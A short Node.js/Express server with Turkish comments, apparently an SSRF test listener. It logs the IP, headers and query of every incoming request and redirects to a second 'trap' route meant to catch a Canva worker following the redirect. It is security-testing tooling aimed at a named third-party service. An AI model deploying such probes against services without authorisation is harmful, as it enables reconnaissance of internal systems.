const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Geniş gövdeleri okuyabilmek için limitleri artırıyoruz
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// 1. AŞAMA: İlk gelen istekleri yakalayan ve yönlendiren rota
app.use((req, res, next) => {
    // Eğer istek zaten ikinci aşamadaki /yakalandi rotasına geldiyse burayı geç
    if (req.path === '/yakalandi') {
        return next();
    }

    const timestamp = new Date().toISOString();
    const clientIp = req.headers['cf-connecting-ip'] || 
                     req.headers['x-forwarded-for'] || 
                     req.socket.remoteAddress;

    console.log('\n' + '='.repeat(60));
    console.log(`[${timestamp}] 🎯 1. ADIM: İLK İSTEK YAKALANDI!`);
    console.log('='.repeat(60));
    console.log(`🔹 Yol (Path)      : ${req.path}`);
    console.log(`🔹 Orijinal URL    : ${req.originalUrl}`);
    console.log(`🔹 Yöntem (Method) : ${req.method}`);
    console.log(`🔹 Gerçek IP       : ${clientIp}`);
    
    if (req.query && Object.keys(req.query).length > 0) {
        console.log('\n--- 🔍 QUERY ---');
        console.dir(req.query, { depth: null, colors: true });
    }
    
    console.log('\n--- 📋 HEADERS ---');
    console.dir(req.headers, { depth: null, colors: true }); // DÜZELTİLDİ: Tek parantez yapıldı
    console.log('='.repeat(60) + '\n');

    // Hedef URL: Aynı sunucunun /yakalandi endpoint'i
    const TARGET_URL = `https://${req.get('host')}/yakalandi`;

    console.log(`⚡ [REDIRECT] İstemci ikinci hedefe fırlatılıyor ➔ ${TARGET_URL}`);

    // HTTP 302 ile kendi içimizdeki ikinci rotaya yönlendiriyoruz
    return res.redirect(302, TARGET_URL);
});

// 2. AŞAMA: Canva worker yönlendirmeyi takip ederse düşeceği tuzak rota (/yakalandi)
app.get('/yakalandi', (req, res) => {
    const timestamp = new Date().toISOString();
    const clientIp = req.headers['cf-connecting-ip'] || 
                     req.headers['x-forwarded-for'] || 
                     req.socket.remoteAddress;

    console.log('\n' + '🔥'.repeat(30));
    console.log(`[${timestamp}] 🚀 BAŞARILI! 2. ADIM: İSTEK YÖNLENDİRMEDEN GEÇİP BURAYA ULAŞTI!`);
    console.log('🔥'.repeat(30));
    console.log(`🔹 Gelen IP (Canva Worker IP'si olabilir): ${clientIp}`);
    console.log(`🔹 Headers:`, req.headers);
    console.log('🔥'.repeat(30) + '\n');

    return res.send("Tebrikler! Redirection zinciri başarıyla takip edildi ve loglandı.");
});

app.listen(PORT, () => {
    console.log(`Çift rotalı SSRF test sunucusu ${PORT} portunda ayakta... 🚀`);
});
